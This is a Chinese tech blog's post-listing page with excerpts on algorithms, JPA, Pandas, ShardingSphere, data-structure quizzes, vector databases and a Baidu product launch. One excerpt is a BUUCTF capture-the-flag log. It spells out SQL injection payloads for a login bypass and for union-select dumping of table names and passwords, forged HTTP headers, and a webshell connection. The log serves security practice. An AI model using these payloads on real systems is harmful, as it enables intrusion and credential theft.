<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 老帅的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://laoshuaiblog.github.io/posts/">
  <meta property="og:site_name" content="老帅的博客">
  <meta property="og:title" content="Posts">
  <meta property="og:description" content="老帅的博客">
  <meta property="og:locale" content="zh-CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="老帅的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="老帅的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">老帅的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1a1bd6c0fc6877d8e03c5697f9d6b57/" rel="bookmark">
			蓝桥杯2023省赛：矩阵总面积|模拟、数学（几何）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目链接： 0矩形总面积 - 蓝桥云课 (lanqiao.cn)
说明： 参考文章：矩形总面积计算器：计算两个矩形的总面积，包括重叠区域_矩形r1的左下角坐标为x1, yl 、宽度为w1、高度为h1, 矩形r2的左下角坐标为x2,y2、宽-CSDN博客
看似简单，实际如果一种一种列举情况写if-else还挺麻烦的。首先很容易看出的是，两矩形不相交的情况：
x[4]&lt;=x[1]||x[3]&gt;=x[2]||y[3]&gt;=y[2]||y[4]&lt;=y[1]
以及一者包含另一者的情况：x[3]&gt;=x[1]&amp;&amp;x[4]&lt;=x[2]&amp;&amp;y[3]&gt;=y[1]&amp;&amp;y[4]&lt;=y[2]、x[3]&lt;=x[1]&amp;&amp;x[4]&gt;=x[2]&amp;&amp;y[3]&lt;=y[1]&amp;&amp;y[4]&gt;=y[2]
但是两者相交的情况，如果要用列举出来，情况非常多，至少以下这么多种情况（黑色为R1，其他颜色为R2）：
所以需要考虑找规律。
按照参考文章的思路，我们需要找到高效率确定重叠区域的方法，二维图形不好想象，首先从两条直线来考虑重叠区域:
由图可知，右边界是两条直线右边界的较小值，左边界是两条直线左边界的较大值，在两个矩形的重叠区域的x方向上也是满足的。如果没有重叠区域，那么找出的左边界将会大于右边界。
由这个方法也可以找到y方向上的上下边界，由此就可以计算出重叠区域的面积，但要判断一下区域是否存在（也就是判断边界差值是否大于0）。
代码： #include&lt;bits/stdc++.h&gt; #define int long long using namespace std; const int N = 1e9; int ans = 0; int x[5],y[5]; signed main() { cin.tie(0); cout.tie(0); for(int i=1;i&lt;5;i++){ cin&gt;&gt;x[i]&gt;&gt;y[i]; } int s1=(y[4]-y[3])*(x[4]-x[3]),s2=(y[2]-y[1])*(x[2]-x[1]); int l,r; l=min(x[2],x[4])-max(x[1],x[3]) ; r=min(y[2],y[4])-max(y[1],y[3]); if(l&gt;0&amp;&amp;r&gt;0){ ans=s1+s2-l*r; } else { ans=s1+s2; } cout &lt;&lt; ans; return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb2bfc328214ac0f6f2c69dae66a93e4/" rel="bookmark">
			JPA使用CriteriaQuery实现动态分组查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JPA中实现动态分组查询，即输入几个筛选参数就按照几个参数进行分组查询，但是不知道输入的是几个参数，要实现动态的分组查询，用CriteriaQuery实现。
Repository：
@Repository public interface TestCostRepository extends JpaRepository&lt;TestCost, Integer&gt;, JpaSpecificationExecutor&lt;TestCost&gt; { } TestCostService：
public interface TestCostService { List&lt;Map&lt;String,String&gt;&gt; dynamicGroupBy(List&lt;String&gt; groupByParams,String sumParam); } TestCostServiceImpl：
@Service public class TestCostServiceImpl implements TestCostService { @Autowired TestCostRepository repository; @Autowired private EntityManagerFactory entityManagerFactory; @Override public List&lt;Map&lt;String, String&gt;&gt; dynamicGroupBy(List&lt;String&gt; groupByParams, String sumParam) { EntityManager entityManager = entityManagerFactory.createEntityManager(); CriteriaBuilder cb = entityManager.getCriteriaBuilder(); CriteriaQuery&lt;Object[]&gt; query = cb.createQuery(Object[].class); Root&lt;TestCost&gt; root = query.from(TestCost.class); List&lt;Expression&lt;?&gt;&gt; expressions = new ArrayList&lt;&gt;(); for (String field : groupByParams) { expressions.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb2bfc328214ac0f6f2c69dae66a93e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/771e3ab085e1f64005d4a385bd9d7381/" rel="bookmark">
			Pandas表格样式设置技巧，漂亮！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是阿粥
今天给大家分享如何给Pandas DataFrame添加颜色和样式。
前排提示，文末送两本商业分析的好书~
通过这一方法，增强数据的呈现，使信息的探索和理解不仅内容丰富，而且具有视觉吸引力。
Pandas Styler是Pandas库中的一个模块，它提供了创建DataFrame的HTML样式表示的方法。
此功能允许在可视化期间自定义DataFrame的视觉外观。Pandas Styler的核心功能在于能够根据特定条件对单元格进行突出显示、着色和格式化。
增强了可视化体验，并能够更直观地解释数据集中包含的信息。
接下来，我们将使用一组数据创建一个数据透视表，为其提供不同的样式和条件格式，最终如上图所示。
数据透视表是一种表格数据结构，它提供来自另一个表的信息的汇总概述，根据一个变量组织数据并显示与另一个变量关联的值。
在本次分析中，我们将使用Apple Store应用程序数据集来探索数据透视表的创建和表格样式的自定义。
数据集涵盖从应用程序名称到大小、价格和评级等细节的各个方面。我们的目标是有效地分解信息，同时应用有效增强数据呈现和理解的风格。 数据说明。
查看环境基础信息。
import pandas as pd import numpy as np import math import matplotlib.pyplot as plt import warnings # 关闭pandas warning warnings.filterwarnings('ignore') print("Python Libraries version:") print(' - '*20) print("Pandas version: ", pd.__version__) print("Numpy version: ", np.__version__) print("Matplotlib version: ", plt.matplotlib.__version__) 结果如下。
读取数据。
# 读取数据 path='data/AppleStore.csv' data =pd.read_csv(path,sep=';') 创建数据透视表。
# 过滤数据，只保留前15个类型 top_genre = data.value_counts('prime_genre')[:15].index.tolist() tmp = data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/771e3ab085e1f64005d4a385bd9d7381/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f3a4d5ec2162ae2a35107583d598afa/" rel="bookmark">
			ShardingSphere&#43;JPA&#43;Druid实现分表操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要在SpringBoot项目中实现分表操作，本文使用的是ShardingSphere+JPA+Druid实现。过程中出现问题记录一下。
准备MySQL数据库表
这里准备的是一张主表test_cost，两张从表test_cost_0和test_cost_1，结构需要相同，主表只是声明了表结构，供后端框架提供映射关系，不存储数据，从表是真正存储数据的表。
引入依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;version&gt;2.6.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt; &lt;version&gt;2.6.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.26&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Spring Boot Starter Test --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;version&gt;2.6.0&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- ShardingSphere --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shardingsphere&lt;/groupId&gt; &lt;artifactId&gt;shardingsphere-jdbc-core-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;5.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-crypto&lt;/artifactId&gt; &lt;version&gt;5.7.8&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.18&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Druid数据源 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.2.8&lt;/version&gt; &lt;/dependency&gt; 配置文件 server: port: 8080 spring: jpa: properties: hibernate: hbm2ddl: auto: update dialect: org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f3a4d5ec2162ae2a35107583d598afa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d11fc0f217a37462f9b062b7368783ea/" rel="bookmark">
			ginblog博客系统/golang&#43;vue
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ginblog博客系统 前台：
后台：
Gitee的项目地址，点击进入下载
注意：
数据库文件导入在model里面，直接导入即可。
admin和front前后台系统记住修改https里的地址为自己的IP地址：
front同上。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/886505f815f560db17be51966564f342/" rel="bookmark">
			二叉树试题解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、单项选择题
01.下列关于二叉树的说法中，正确的是( C ).
A.度为2的有序树就是二叉树
B.含有n个结点的二叉树的高度为
C.在完全二叉树中，若一个结点没有左孩子，则它必是叶结点
D.含有n个结点的完全二叉树的高度为
解析：A 二叉树中，若某结点只有一个孩子，则这个孩子的左右次序是确定的，而在度为2 的有序树中，若某节点只有一个孩子，则这个孩子就无需区分其左右次序
B仅当是完全二叉树时才有意义，对于任意一颗二叉树，高度可能为~n
C在完全二叉树中，若有度为1的结点，则只可能有一个，且该结点只有左孩子而没有右孩子
D完全二叉树的高度为或
02.“二叉树为空”意味着二叉树( C ).
A.根结点没有子树 B.不存在
C.没有结点 D.由一些没有赋值的空结点构成
03.以下说法中，正确的是（ A)。
A.在完全二叉树中，叶结点的双亲的左兄弟（若存在）一定不是叶结点
B.任何一棵二叉树中，叶结点数为度为2的结点数减1，即n0=n2-1
C.完全二叉树不适合顺序存储结构，只有满二叉树适合顺序存储结构
D.结点按完全二叉树层序编号的二叉树中，第i个结点的左孩子的编号为2i
解析：在完全二叉树中，叶结点的双亲的左兄弟的孩子一定在其前面（且一定存在)，所以双亲的左兄弟（若存在)一定不是叶结点，选项A正确。n应等于n2+ 1，选项B错误。完全二叉树和满二叉树均可以采用顺序存储结构，选项C错误。第i个结点的左孩子不一定存在，选项D错误。
04．具有10个叶结点的二叉树中有( B )个度为2的结点。
A.8 B.9 C. 10 D.11
解析：由二叉树的性质n0=n2+1,得n2=n0-1=10-1=9
05.设高度为h的二叉树上只有度为0和度为2的结点，则此类二叉树中所包含的结点数至
少为( B ).
A. h B.2h-1 C. 2h+1 D.h+1
解析：结点最少的情况如下图所示。除根结点层只有1个结点外，其他h-1层均有两个结点,点总数=2(h-1)+1= 2h-1。
06.具有n个结点且高度为n的二叉树的数目为( D )。
A.logn B.n/2 C. n D.2n-1
解析：除根结点外，在其余n -1个结点中，每个结点要么是其父结点的左孩子，要么是其父结点的右孩子，每个结点都有两种可能，n-1个结点共有2^n-1种不同的组合形态。
07．假设一棵二叉树的结点个数为50，则它的最小高度是（C).
A.4 B.5 C. 6 D.7
解析：第一层1个，第二层2个，第三层4个，第四层8个，第五层16个，第六层50-31=19个
08．设二叉树有2n个结点，且m&lt;n，则不可能存在（C)的结点。
A. n个度为0 B.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/886505f815f560db17be51966564f342/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a736088b721a815c25f8a0ac1590a5d5/" rel="bookmark">
			node.js常用的命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		node.js常用的命令包括：
安装包。使用`npm install &lt;包名&gt;@版本号`安装指定版本的包，或者使用`npm install &lt;包名&gt;`安装包到当前目录。
卸载包。使用`npm uninstall &lt;包名&gt;`卸载包。
全局安装包。使用`npm install &lt;包名&gt; -g`全局安装包。
查看包信息。使用`npm info &lt;包名&gt;`查看远程包信息，或者使用`npm ls &lt;包名&gt;`查看本地包信息。
设置npm配置。使用`npm config set &lt;配置名&gt; &lt;配置值&gt;`设置npm的配置。
切换npm镜像源。使用`npm config get registry`查看当前的npm镜像源，然后使用`npm config set registry=https://registry.npm.taobao.org`将镜像源切换为淘宝。
以上命令可以帮助开发者更好地管理和使用node.js项目中的包。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ace36cf911f2e56daff281d009100d0/" rel="bookmark">
			[BT]BUUCTF刷题第3天（3.21）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第3天（共4题） Web [极客大挑战 2019]LoveSQL Payload：/check.php?username=1' union select 1,(select group_concat(password) from l0ve1ysq1),3%23&amp;password=1
看到登录页面，先尝试万能密码：
用户名：1' or True# 密码：123（随便输） 成功登录且获得密码加密值，但在这里无法解密，考虑其他注入(这里是联合注入)
使用?username=admin' order by 数字%23&amp;password=1来确定当前表的字段数，当数字设为4时报错，说明字段数为3，然后来确定回显点（%23时#的url编码，代表注释）
使用?username=1' union select 1,2,3%23&amp;password=1发现回显点是2和3，那么就在这两个地方返回数据
首先爆表：
?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1 发现返回两个表，geekuser和l0ve1ysq1
然后爆字段：
?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&amp;password=1 最后爆内容：
?username=1' union select 1,(select group_concat(password) from l0ve1ysq1),3%23&amp;password=1 F12查看得到flag
[极客大挑战 2019]Http 打开网站往下滑没有找到明限突破口
F12后在最后一段文字源代码下方有一个超链接，由于onclick="return false"，所以点击这段文字没有反应，这里直接访问这个文件
根据题目名字和该页面显示，分析需要构造Referer
根据后面的提示，一共需要构造：
Referer：https://Sycsecret.buuoj.cn
User-Agent：Syclover
X-Forwarded-For：localhost
即可得到flag
[极客大挑战 2019]Knife 打开网站一目了然，需要用蚁剑进行一句话木马连接，而且木马已经说明存在，打开蚁剑连接
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4ace36cf911f2e56daff281d009100d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf1e5264e8a654091128112cff5c69cc/" rel="bookmark">
			【Java】嚼烂基础之接口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、接口1.1 接口的概念1.2 接口的语法规则1.3 接口的使用1.3.1 接口运用具体样例 1.4 接口的特性1.4.1 实现多个接口 1.5 接口间的继承1.6 Clonable接口和深拷贝1.6.1Clonable接口1.6.2浅拷贝与深拷贝 1.7 抽象类与接口的区别 结语 前言 我们对Java对象和多态的概念了一定的了解，今天我们就来深入学习Java面向对象魅力之“接口”。本篇文章将详细介绍Java语言中的接口interface概念，包括使用方法、特性、使用实例、抽象类与接口的区别，话不多说，让我们开始吧！！
一、接口 1.1 接口的概念 一说到接口，相比会很自然地联想到现实生活中的[接口]，比如：笔记本上的USB口，耳机孔，电源插座等等。
电脑的USB口上，可以插：U盘、鼠标、键盘…所有符合USB协议的设备
电源插座插孔上，可以插：冰箱、电脑电源线、电视机…所有符合规范的设备
总结下来不难发现：接口就是公共的行为规范标准，大家在实现时，只要符合规范，就可以通用。
而今天我们Java语言中的接口也异曲同工。
在JAVA中，接口可以看成是：多个类的公共规范，是一种引用数据类型。
1.2 接口的语法规则 接口的定义格式和定义类的格式基本相同，将class关键字换成interface关键字就成功定义了一个接口。
public interface 接口名称{ //抽象方法 public abstract void method1(); //public abstract是默认搭配，可以不写 void method2(); void method3(); } 注意：
创建接口时，接口的命名一般以大写字母I开头接口的命名一般使用形容词词性的单词阿里编码规范中约定，接口中的方法和属性不要加任何修饰符号，保持代码的简洁性 1.3 接口的使用 接口不能直接使用，必须要有一个“实现类”来“实现”该接口，实现接口中的所有抽象方法。 规则如下所示：
public class 子类名 implements 接口名称{ // ... } 子类和父类之间是extends 继承关系
类和接口之间是implements 实现关系
1.3.1 接口运用具体样例 请实现笔记本电脑使用USB鼠标、USB键盘的例子
USB接口：包含打开设备、关闭设备功能笔记本类：包含开机功能、关机功能、使用USB设备功能鼠标类：实现USB接口，并具备点击功能键盘类：实现USB接口，并具备输入功能 代码如下：
interface IUSB{ void OpenDevice(); void CloseDevice(); } class Mouse implements IUSB{ @Override public void OpenDevice() { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf1e5264e8a654091128112cff5c69cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/508c33a3906f415d1fa6d6e90fccd1e6/" rel="bookmark">
			双哈希统计，LeetCode 2671. 频率跟踪器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、题目 1、题目描述 请你设计并实现一个能够对其中的值进行跟踪的数据结构，并支持对频率相关查询进行应答。
实现 FrequencyTracker 类：
FrequencyTracker()：使用一个空数组初始化 FrequencyTracker 对象。void add(int number)：添加一个 number 到数据结构中。void deleteOne(int number)：从数据结构中删除一个 number 。数据结构 可能不包含 number ，在这种情况下不删除任何内容。bool hasFrequency(int frequency): 如果数据结构中存在出现 frequency 次的数字，则返回 true，否则返回 false。 2、接口描述 python3 class FrequencyTracker: def __init__(self): def add(self, number: int) -&gt; None: def deleteOne(self, number: int) -&gt; None: def hasFrequency(self, frequency: int) -&gt; bool: # Your FrequencyTracker object will be instantiated and called as such: # obj = FrequencyTracker() # obj.add(number) # obj.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/508c33a3906f415d1fa6d6e90fccd1e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a348633e52e19eea0120d4885c8850d6/" rel="bookmark">
			向量数据库的理论知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是向量数据库 向量数据集是指由向量（也称为数组）组成的数据集。在机器学习和数据分析中，向量数据集通常用来表示一组特征或属性，每个向量代表一个数据点。这种数据集通常被用于训练机器学习模型，进行数据分析和模式识别等任务。向量数据集可以是一维的（包含一个特征）或多维的（包含多个特征），具体取决于具体的应用场景和数据结构。
向量数据库与传统数据库的区别在于数据类型。向量数据库专门用于存储向量数据。采用基于向量索引的存储方式，并支持基于向量相似度的查询。
而传统数据库可以存储各种类型的数据，采用关系型模型或其他存储方式，并支持各种查询语言
什么是向量 向量是指一组有序数值组成的对象。向量可以表示空间中的一个点或者某种属性的集合。
如二维向量（两个分量）、三维向量（三个分量）。
每个分量可以是任意实数或复数
举个例子： 以前主要通过打标记来识别物种。
比如，给张三打上标记来识别他，标记是身高、肤色、容貌
如果张三有个双胞胎弟弟，只需要再加一个维度。维度和特征越多识别就越准确。
向量嵌入Vector embedding 是将离散的对象或数据映射到连续的向量空间的过程。其中的向量叫做嵌入向量。
在NLP中，向量嵌入通常用于表示单词、短语或句子。向量嵌入也是把对象转换成向量的过程。
向量嵌入可以将数据的语义信息保留在向量空间中，因此向量数据库可以使用相似度度量来进行检索，从而实现基于语义的搜索。
向量搜索 Vector search 一般对语料的搜索可以通过向量之间的距离来判断它们的相似度。
如果需要搜索某个相似的想来是不是需要对库中的每个向量进行比较。但这种的计算量是非常巨大的，所以需要一种更加高效的算法来解决这个问题。
比较两个向量的相似的方法有很多
常见的有：
点积（dot product）：向量的点积相似度是指两个向量之间的点积值，它适用于许多实际场景。例如图像识别、语义搜索和文档分类等。但点积相似度算法对向量的长度敏感，因此在计算高维向度的相似性时可能会出现问题。
内积（inner product）：是一种计算向量之间相似度的度量算法。它计算两个向量之间的点积（内积），所得值越大越与搜索值相似。
欧式距离（L2）：直接比较两个向量得欧式距离，距离越近越相似。欧几里得算法的优点是可以反映向量的绝对距离，适用于需要考虑向量长度的相似性计算。例如推荐系统中，需要根据用户的历史行动来推荐相似的商品，这时就需要考虑用户的历史行为的数量而不仅仅是用户的历史行为的相似度。
余弦相似度（Cosine）：两个向量的夹角越小越相似，比较两个向量的余弦值进行比较。夹角越小，余弦值越大。余弦相似度对向量的长度不敏感，只关注向量的方向，因此适用于高维向量的相似性计算。对于比较向量，也会出现性能问题，尤其是海量的向量模型库中比较，那么就可以通过优化向量来提高搜索效率。
主要有两种方式：
1、减少向量大小--通过降维或减少表示向量值的长度 比如向量降维 压缩等。
2、缩小搜索范围--可以通过聚类或将向量组织成基于树形 图形结构来实现。并限制搜索范围仅在最接近的簇中进行。或者通过最相似的分支进行过滤。
比如如果一枚戒指掉到大海，面对这么大的海域怎么找呢？
首先找到掉的大致范围
再找到有人造金属的海床，然后找到制造针的金属物质，最后在这对金属物质里找就相对容易点了。
找的过程也是一种内聚的过程。
向量数据库应用场景（Vector Database Application Scenarios） Elasticsearch数据库简单的向量操作，简称ES
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6231c347e68bd53e86c0db2de02fcd29/" rel="bookmark">
			【精彩回顾】百度智能云千帆产品3月21日发布会
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		3月21日，AI Cloud Day：百度智能云千帆产品发布会在北京举办。会议聚焦百度智能云千帆大模型平台最新进展，分享思考与实践。百度智能云在发布会期间宣布：
&gt;&gt;满足企业“效价比”核心诉求，千帆ModelBuilder大模型服务全面升级，3个轻量级大模型、2个垂直场景模型集体问世；
&gt;&gt;大幅降低AI原生应用开发门槛，千帆AppBuilder全面升级；
&gt;&gt;携手北京市石景山区，共建全国首个百度智能云千帆大模型产业创新基地，助推区域产业腾飞。
会上，百度副总裁谢广军发表了以“百度智能云千帆，产业创新新引擎”的主题演讲，分享了千帆AppBuilder、ModelBuilder的最新产品进展。谢广军在演讲中表示：大模型技术在过去一年飞速发展，随着逐步落地千行百业，2024年将成为国内大模型产业应用爆发的元年。针对企业最关心的大模型落地场景、使用成本、应用开发、应用效果四大挑战，百度智能云千帆平台在大模型、AI原生应用开发两个方面给出了最新“解题思路”，助力企业业务核心场景，实现最优效价比。
百度副总裁谢广军
以下为演讲实录：
各位领导、来宾、媒体朋友们，大家上午好，很高兴今天在石景山首钢园，和大家一起沟通和探讨大模型的发展趋势，以及百度最近一段时间的思考和实践。
自去年3月27日发布千帆大模型平台到今天刚好一年的时间，过去这一年，国内外的大模型都在迅速发展，尤其应用的爆发趋势更加明显。从发展趋势来看，有这么几个特点：
&gt;&gt;第一，大模型的技术在不断进步优化，通过模型架构改进、训练算法的调优等，大模型的效率和性能都得到了显著提升。
&gt;&gt;第二，行业应用场景的成熟，大模型在各种行业已经开始落地应用，这些实践经验激发了更多行业的兴趣和投入。
&gt;&gt;第三，政府、投资机构对人工智能技术的支持不断增加，为大模型的研发、部署和应用提供了更多资源和机会。
&gt;&gt;第四，人们对人工智能技术的理解和接受度不断提高，用户对于智能化、个性化服务的需求，也推动了大模型在各种场景中的应用。
在过去一年与企业的实际接触过程中，我们发现：企业面临着几大挑战：
落地场景的探索
应用开发的门槛
推理和训练的成本
落地应用的效果
为了解决这些挑战，帮助企业用户落地，千帆给大家提供了一整套的大模型开发工具，从算力到模型、应用开发，层层结合，为企业提供大模型服务的超级工厂，帮助企业降低成本、提高效率和模型应用的效果。
千帆平台自发布以来一直保持着一个高速的增长趋势，跟去年12月比，千帆的日均季度环比增长了97%，翻了接近一倍。
同时，我们也很高兴地跟大家宣布，千帆平台服务客户数，突破了8万，最近一个月就增长了近1万。平台上已经精调出1.3w个模型，并且开发应用数也达到了16w的规模，基于这些数据大家也可以看到，大模型已经真正进入到了快速增长的阶段。
未来，千帆也将帮助企业客户、开发者看到更多的“创新机会”。
随着千帆的客户数量不断增多，我们感受到，大家关心的是怎么把大模型“用起来”，真正给企业业务带来价值。
今天，我就为大家带来全新升级的AI原生应用开发平台AppBuilder，以最好的应用效果、最优的开发体验支撑AI原生应用的繁荣。
千帆AppBuilder，是一个产业级的AI原生应用开发平台，它可以帮助广大的客户和开发者不断降低应用开发门槛。
AppBuilder底层由基础组件和高级组件构成。
在基础组件中，包含大模型组件、AI能力组件等，这些组件都是基于百度多年的技术和实践经验沉淀的。
除了基础组件，AppBuilder还面向典型的应用场景，深入调优建设了一系列高级组件，比如知识问答类的RAG、具备运算能力的代码解释器，以及生成式数据分析GBI等。
基础组件和高级组件共同支撑Agent，一方面可以通过工作流编排实现更为复杂的业务逻辑，另一方面Agent也具备强大的自主任务规划能力。
所有这些底层能力，通过代码态和零代码态两种形态提供服务。同时，多渠道对外集成分发。
千帆AppBuilder具备三大核心优势特点，
&gt;&gt;第一，应用效果领先：具备高精度知识问答效果，及精准的自主任务规划能力；
&gt;&gt;第二，组件多元化且支持自定义接入；
&gt;&gt;第三，产品开放易用。
接下来给大家带来详细的介绍：
讲应用效果就离不开场景，知识问答（也就是RAG）是大模型最典型的应用场景之一。
AppBuilder在这个场景建设了企业级全链路检索增强的应用框架及周边工具，并做了很多深入细致的优化工作，使得知识问答效果达到更好的水平。这里包括底层基座模型的SFT调优，也包括文档解析、语义匹配、问题拆解等各环节的策略优化。
通过这些优化，AppBuilder的RAG在多场景问答准确率、友好回复、准确拒答等方面可接受度达95%以上。
大家可以看到右边这组知识问答效果对比数据，AppBuilder产品的效果，超越了其他同类产品的效果。
另一个非常典型的应用场景是Agent，AppBuilder也构建了具备精准自主任务规划能力的Agent框架，可实现多工具自动编排，准确率90%以上；官方提供可被编排工具近30种，覆盖电商/互娱/办公/专业服务等主流场景。
同时，AppBuilder支持开发者接入自定义工具，通过自动编排与手动编排的结合，实现复杂场景需求的定制；
另外，代码解释器的效率与效果持续提升，相比升级前性能提升40%、数据分析场景可接受度提升到95%。
下面，我们来看一个视频，这个视频核心呈现的就是Agent的精准自主任务规划能力。
我们可以看到，面对不同的任务，Agent通过自主调度不同的工具组件来精准回答用户的各类问题。
AppBuilder具备丰富的组件工具，目前已扩充到55个，这些组件包括基于百度技术积累和自有业务沉淀的大模型能力组件，如多轮改写、复杂Query分解等，AI能力组件，比如TTS、OCR、图像识别等，通过大小模型联合及业务场景化工具组件，共同支撑AI原生应用的开发；
另外，还有百度独家开放的业务组件，如：百度搜索，在这方面百度有着深厚的积累。还有一些业界主流场景的第三方API，比如航班查询、论文查询等；
同时，支持用户接入自定义组件，我们还提供百度基础云的一些组件，比如BES等，这里特别提下向量数据库VDB，它也迎来了一次全新的升级。
向量数据库是企业不可或缺的知识库核心组件，它针对传统知识库问答系统所遇到的性能瓶颈、维护挑战及规模限制等问题提供了有力解决方案。
VDB1.0，这一革命性的数据库内核，不仅集成了全面的运维控制和安全防护能力，还兼容了千帆、LangChain等主流生态系统，使企业能够轻松管理数以千万计的文档知识。
在性能表现上，VDB与同类型开源产品相比，其在不同应用场景下的性能有不同程度的提升，最高可达10倍，真正实现了毫秒级的向量检索速度。
同时，在扩展性方面，支持最大百亿级别的向量数据存储，以及秒级的弹性伸缩响应。这些突出优势确保了VDB能够伴随企业业务的不断发展而升级，持续满足日益增长的业务需求。
再回到AppBuilder，它的第三大优势是开放易用，首先体现在：主流场景的工具组件开放可灵活编排，提供丰富的应用示例，用户一次鉴权全部接入；其次，提供开源的RAG和Agent SDK ，支持二次开发。本次升级后，最快只需要三步即可完成应用的创建与开发，还可一键对接百度灵境矩阵、微信公众号、微信客服、Web端/H5等渠道。这里也特别说一下百度灵境矩阵，此次与灵境矩阵的打通，应用将有机会在百度强大的搜索场景中轻松实现分发和挂载，同时也能融入百度的信息流场景，吸引更多潜在用户的目光。
下面，我们就来看一个从0到1快速搭建应用的示例。
现在很多家长辅导孩子写英语作业就很痛苦，那么我们现在用AppBuilder这样一个平台，就可以创建一个【英语作文批改小助手】来辅助家长。
appbuilder英文作文小助手（配音版）
大家看到，这样一个应用的搭建，不到1分钟即可完成。
目前，已经有好几万的开发者和伙伴，通过AppBuilder创建出各种场景的AI原生应用。
